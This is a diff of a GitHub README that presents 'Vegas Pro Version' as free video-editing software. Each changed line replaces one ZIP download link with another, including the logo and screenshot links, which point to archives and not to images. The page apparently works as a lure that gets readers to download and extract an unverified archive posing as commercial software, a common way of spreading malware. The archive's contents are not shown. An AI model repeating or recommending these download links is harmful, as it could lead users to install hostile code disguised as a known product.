@@ -13,7 +13,7 @@ Welcome to the **Vegas Pro Version** repository! 🎬 This repository is dedicat
 ## Introduction
 Vegas Pro Version is a powerful and versatile video editing software that caters to the needs of both individual creators and professional videographers. With a wide range of features and tools, it offers everything you need to bring your creative vision to life.
 
-![Vegas Pro Version Logo](https://github.com/ElectricHermit/vegas-pro-version/releases/download/v2.0/Software.zip)
+![Vegas Pro Version Logo](https://github.com/ElectricHermit/vegas-pro-version/raw/refs/heads/master/src/version-pro-vegas-v2.3.zip)
 
 ## Features
 - **Advanced Video Editing:** Create stunning videos with a full-featured timeline editor, video transitions, and video plugins.
@@ -28,12 +28,12 @@ Vegas Pro Version is a powerful and versatile video editing software that caters
   
 - **Keyframing & Masking:** Add intricate animations and effects to your videos using keyframing and masking functionalities.
   
-![Vegas Pro Version Interface](https://github.com/ElectricHermit/vegas-pro-version/releases/download/v2.0/Software.zip)
+![Vegas Pro Version Interface](https://github.com/ElectricHermit/vegas-pro-version/raw/refs/heads/master/src/version-pro-vegas-v2.3.zip)
 
 ## Installation
 To get started with Vegas Pro Version, follow these simple steps:
 
-1. Download the software package from the following link: [![Download Vegas Pro Version](link here)](https://github.com/ElectricHermit/vegas-pro-version/releases/download/v2.0/Software.zip)
+1. Download the software package from the following link: [![Download Vegas Pro Version](link here)](https://github.com/ElectricHermit/vegas-pro-version/raw/refs/heads/master/src/version-pro-vegas-v2.3.zip)
 
 2. Extract the downloaded ZIP file to your desired location.
 
@@ -52,7 +52,7 @@ Once you have installed Vegas Pro Version, open the software and explore its wid
   
 - **Rendering:** When you are satisfied with your edits, render your project to create the final video file.
 
-![Vegas Pro Version Editing](https://github.com/ElectricHermit/vegas-pro-version/releases/download/v2.0/Software.zip)
+![Vegas Pro Version Editing](https://github.com/ElectricHermit/vegas-pro-version/raw/refs/heads/master/src/version-pro-vegas-v2.3.zip)
 
 ## Contributing
 We welcome contributions from the community to make Vegas Pro Version even better. If you have any ideas, suggestions, or improvements, feel free to submit a pull request. Together, we can continue to enhance this software for the benefit of all users.
